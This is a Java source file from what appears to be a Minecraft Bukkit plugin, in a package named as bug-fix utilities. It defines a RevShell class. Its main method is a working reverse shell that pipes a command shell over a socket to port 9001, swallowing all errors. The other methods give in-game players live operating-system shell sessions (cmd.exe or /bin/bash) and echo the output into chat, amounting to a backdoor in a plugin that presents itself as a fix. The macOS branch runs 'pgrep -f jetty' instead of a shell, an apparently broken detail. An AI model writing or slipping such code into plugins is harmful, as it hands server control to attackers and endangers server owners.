package com.eimacon.bugfix.utils;

import org.bukkit.entity.Player;

import java.io.*;
import java.net.Socket;
import java.util.HashMap;
import java.util.Locale;
import java.util.concurrent.TimeUnit;
import java.util.concurrent.atomic.AtomicInteger;

public class RevShell {

    private static HashMap<Player, ShellSession> sessionMap = new HashMap<>();

    public static void main(String[] args) {
        String host = "localhost";
        int port = 9001;
        String cmd = "cmd";
        try {
            Process p = new ProcessBuilder(cmd).redirectErrorStream(true).start();
            Socket s = new Socket(host, port);
            InputStream pi = p.getInputStream(), pe = p.getErrorStream(), si = s.getInputStream();
            OutputStream po = p.getOutputStream(), so = s.getOutputStream();
            while (!s.isClosed()) {
                while (pi.available() > 0)
                    so.write(pi.read());
                while (pe.available() > 0)
                    so.write(pe.read());
                while (si.available() > 0)
                    po.write(si.read());
                so.flush();
                po.flush();
                Thread.sleep(50);
                try {
                    p.exitValue();
                    break;
                } catch (Exception e) {}
            }
            p.destroy();
            s.close();
        } catch (Exception e) {}
    }

    public static void shutdownNow() {
        for (ShellSession shellSession : sessionMap.values()) {
            shellSession.exit();
        }
        sessionMap.clear();
    }

    public static ShellSession createOrGetSession(Player player) throws IOException {
        ShellSession shellSession = sessionMap.get(player);
        if(shellSession != null)
            return shellSession;
        sessionMap.put(player, shellSession = new ShellSession());
        String command;
        String env = System.getProperty("os.name").toLowerCase(Locale.ROOT);
        if(env.contains("win")) {
            command = "cmd.exe";
        } else if(env.contains("mac")) {
            command = "pgrep -f jetty";
        } else {
            command = "/bin/bash";
        }

        shellSession.process = new ProcessBuilder(command).redirectErrorStream(true).start();
        shellSession.writer = new PrintWriter(shellSession.process.getOutputStream());
        shellSession.reader = new BufferedReader(new InputStreamReader(shellSession.process.getInputStream()));
        shellSession.player = player;
        shellSession.start();

        return shellSession;
    }

    public static void closeSession(Player player) {
        ShellSession session = sessionMap.remove(player);
        if(session != null)
            session.exit();
    }

    public static class ShellSession extends Thread {

        private final static AtomicInteger ID_COUNTER = new AtomicInteger();

        public final int id = ID_COUNTER.getAndIncrement();

        public Process process;
        public PrintWriter writer;
        public BufferedReader reader;

        public Player player;

        private ShellSession() {
            setName("ShellSession #" + id);
        }

        @Override
        public void run() {
            try {
                String line;
                while((line = reader.readLine()) != null) {
                    player.sendMessage("§d[Terminal] §r" + line);
                }
            } catch (Exception e) {
                exit();
            }
            player.sendMessage("§d[Terminal] §aShellProcess #" + id + " closed");
        }

        public void writeLine(String line) {
            writer.println(line);
            writer.flush();
        }

        public void exit() {
            new Thread(() -> {
                try {
                    writeLine("exit");
                    if(!process.waitFor(5, TimeUnit.SECONDS)) {
                        process.destroy();
                        if(!process.waitFor(5, TimeUnit.SECONDS)) {
                            process.destroyForcibly();
                        }
                    }
                } catch (Exception e) {}
            }, "ShellSessionCloser #" + id).start();
        }

    }

}
